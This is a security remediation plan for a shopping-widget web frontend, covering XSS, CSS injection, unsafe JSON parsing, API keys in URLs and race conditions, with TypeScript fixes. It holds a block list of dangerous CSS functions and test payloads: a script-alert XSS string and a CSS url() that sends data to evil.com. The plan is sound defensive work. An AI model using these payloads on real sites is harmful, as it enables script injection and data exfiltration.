# Security Remediation Plan

**Document Type:** Security Action Items  
**Created:** January 12, 2026  
**Priority:** CRITICAL items require immediate attention

---

## 🔴 CRITICAL: XSS in Shopping Assistant

### Issue
The `BotMessage.tsx` component uses `dangerouslySetInnerHTML` with inadequate sanitization.

### Current Code
```tsx
// src/official-widgets/shopping-assistant/components/BotMessage.tsx
const processMessageForDisplay = (message: string): string => message
    .replaceAll(/</g, '&lt;')
    .replaceAll(/>/g, '&gt;')
    .replaceAll(/\*\*(.*?)\*\*/g, '<b>$1</b>')
    .replaceAll(/\n/g, '<br>');
```

### Problem
- Custom sanitization is insufficient and bypassable
- Markdown transformation happens AFTER encoding, creating potential gaps
- No comprehensive XSS protection

### Fix

#### Step 1: Install DOMPurify
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

#### Step 2: Create Sanitization Utility
Create file: `src/common/utils/sanitize.ts`
```typescript
import DOMPurify from 'dompurify';

export const sanitizeHtml = (dirty: string): string => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: []
  });
};

export const processMarkdownToHtml = (message: string): string => {
  // First convert markdown-like syntax to HTML
  const withBold = message.replaceAll(/\*\*(.*?)\*\*/g, '<b>$1</b>');
  const withBreaks = withBold.replaceAll(/\n/g, '<br>');
  
  // THEN sanitize the result
  return sanitizeHtml(withBreaks);
};
```

#### Step 3: Update BotMessage.tsx
```tsx
import { processMarkdownToHtml } from '../../../common/utils/sanitize';

// Replace processMessageForDisplay with:
<div dangerouslySetInnerHTML={{ __html: processMarkdownToHtml(message) }} />
```

---

## 🔴 CRITICAL: CSS Injection

### Issue
Custom CSS from configuration is injected directly without validation.

### Current Code
```typescript
// src/common/client/initialization.ts
customCss.innerHTML = customizations.customCss;
```

### Problem
- Malicious CSS can exfiltrate data via `url()` in background images
- Can load external resources for user tracking
- `expression()` can execute JS in older IE

### Fix

#### Step 1: Install CSS Parser
```bash
npm install css-tree
npm install --save-dev @types/css-tree
```

#### Step 2: Create CSS Validator
Create file: `src/common/utils/css-validator.ts`
```typescript
import * as csstree from 'css-tree';

const DANGEROUS_PROPERTIES = [
  'behavior',        // IE-specific JS execution
  '-moz-binding',    // Firefox XBL binding
];

const DANGEROUS_FUNCTIONS = [
  'expression',      // IE JS execution
  'url',             // External resource loading (optional - may be too restrictive)
];

export const validateAndSanitizeCss = (css: string): string => {
  try {
    const ast = csstree.parse(css);
    
    csstree.walk(ast, {
      visit: 'Declaration',
      enter(node, item, list) {
        // Remove dangerous properties
        if (DANGEROUS_PROPERTIES.includes(node.property.toLowerCase())) {
          list.remove(item);
        }
      }
    });

    csstree.walk(ast, {
      visit: 'Function',
      enter(node, item, list) {
        // Block dangerous functions
        if (DANGEROUS_FUNCTIONS.includes(node.name.toLowerCase())) {
          // Log for monitoring
          console.warn(`Blocked dangerous CSS function: ${node.name}`);
          list.remove(item);
        }
      }
    });

    return csstree.generate(ast);
  } catch (e) {
    console.error('Failed to parse CSS:', e);
    return ''; // Return empty on parse failure
  }
};
```

#### Step 3: Update initialization.ts
```typescript
import { validateAndSanitizeCss } from './utils/css-validator';

// Before:
customCss.innerHTML = customizations.customCss;

// After:
customCss.innerHTML = validateAndSanitizeCss(customizations.customCss);
```

---

## 🟠 HIGH: Unsafe JSON.parse

### Issue
`JSON.parse()` on localStorage data can throw if data is corrupted.

### Affected Files
- `src/common/components/hooks/use-search-as-you-type.tsx`
- `src/official-widgets/camera-search/camera-search.tsx`

### Fix Pattern
```typescript
// BEFORE (unsafe):
const data = JSON.parse(localStorage.getItem('key') || '[]');

// AFTER (safe):
const safeJsonParse = <T>(json: string | null, fallback: T): T => {
  if (!json) return fallback;
  try {
    return JSON.parse(json) as T;
  } catch (e) {
    console.error('Failed to parse JSON:', e);
    return fallback;
  }
};

const data = safeJsonParse<SearchHistoryEntry[]>(
  localStorage.getItem('key'),
  []
);
```

Create utility: `src/common/utils/safe-storage.ts`
```typescript
export const safeGetJson = <T>(key: string, fallback: T): T => {
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : fallback;
  } catch {
    return fallback;
  }
};

export const safeSetJson = (key: string, value: unknown): boolean => {
  try {
    localStorage.setItem(key, JSON.stringify(value));
    return true;
  } catch {
    // Quota exceeded or other error
    return false;
  }
};
```

---

## 🟠 HIGH: API Keys in URLs

### Issue
API keys are passed as URL query parameters, exposing them in logs.

### Current Pattern
```typescript
`${endpoint}/v1/product/...?app_key=${appSettings.appKey}&...`
```

### Recommendation
While full fix requires API changes, add header-based auth where supported:
```typescript
const headers = new Headers({
  'X-Api-Key': appSettings.appKey,
  'Content-Type': 'application/json'
});

fetch(url, { headers });
```

---

## 🟡 MEDIUM: Missing Fetch Error Handling

### Issue
Network requests don't handle failures properly.

### Example from shoppable-lookbook.tsx
```typescript
// BEFORE:
const response = await fetch(url);
const data = await response.json();
setGalleryProducts(data.result);

// AFTER:
try {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  }
  const data = await response.json();
  if (data.result) {
    setGalleryProducts(getFlattenProducts(data.result));
  }
} catch (error) {
  console.error('Failed to fetch gallery products:', error);
  setError('Failed to load products. Please try again.');
} finally {
  setIsLoading(false);
}
```

---

## 🟡 MEDIUM: Race Conditions in useEffect

### Issue
Multiple useEffect hooks with overlapping dependencies can trigger simultaneous API calls.

### Example from camera-search.tsx
```typescript
// Current: Three separate effects can fire simultaneously
useEffect(() => { if (image) multisearch(); }, [boxData]);
useEffect(() => { if (image) multisearch(); }, [isComplementary]);
useEffect(() => { if (image) multisearch(); }, [image]);
```

### Fix: Use AbortController
```typescript
useEffect(() => {
  if (!image) {
    resetSearch();
    return;
  }
  
  const controller = new AbortController();
  
  multisearch({ signal: controller.signal });
  
  return () => controller.abort();
}, [image, boxData, isComplementary]);
```

---

## Verification Checklist

After implementing fixes:

- [ ] XSS test: Try injecting `<script>alert(1)</script>` in bot messages
- [ ] CSS test: Try injecting `background: url('https://evil.com/track?data=x')`
- [ ] JSON parse test: Corrupt localStorage data and verify graceful handling
- [ ] Network test: Disable network and verify error handling
- [ ] Race condition test: Rapidly change filters and verify single response

---

## Security Testing Tools

Add to CI pipeline:
```bash
# Static analysis
npm install --save-dev eslint-plugin-security
npx eslint --plugin security ./src

# Dependency audit
npm audit

# Consider adding:
# - Snyk for dependency scanning
# - SonarQube for code quality
```
